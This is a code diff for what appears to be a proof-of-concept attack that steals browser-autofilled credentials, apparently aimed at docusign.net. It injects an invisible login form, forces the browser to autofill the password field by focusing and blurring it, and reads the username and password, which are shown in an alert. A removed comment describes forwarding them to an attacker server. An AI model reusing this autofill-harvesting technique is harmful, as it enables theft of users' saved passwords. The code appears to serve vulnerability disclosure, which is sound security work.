@@ -45,7 +45,7 @@ inputPassword.autocomplete = 'current-password';
 inputPassword.style.border = "none";
 inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
-inputPassword.style.width = "100%";  // Adjusted width to be visible
+inputPassword.style.width = "100%"; // Adjusted width to be visible
 inputPassword.classList.add("single-input");
 
 // Append the input fields to the form
@@ -62,10 +62,14 @@ setTimeout(function() {
 
     function f() {
         if (b.value.length > 0) {
-            alert(`Here is user credentials that can be forwarded into attacker server (I implemented the poc in this way to prevent your credentials from being redirected to my website): ${a.value}, Password = ${b.value}`);
+            alert(`Here are the user credentials for docusign.net: Username = ${a.value}, Password = ${b.value}`);
         }
     }
 
-    a.addEventListener('click', f);
-    a.addEventListener('input', f);
+    a.addEventListener('click', function() {
+        // Trigger the input event to fill the password field with saved credentials
+        b.focus();
+        b.blur();
+        f();
+    });
 }, 1000);
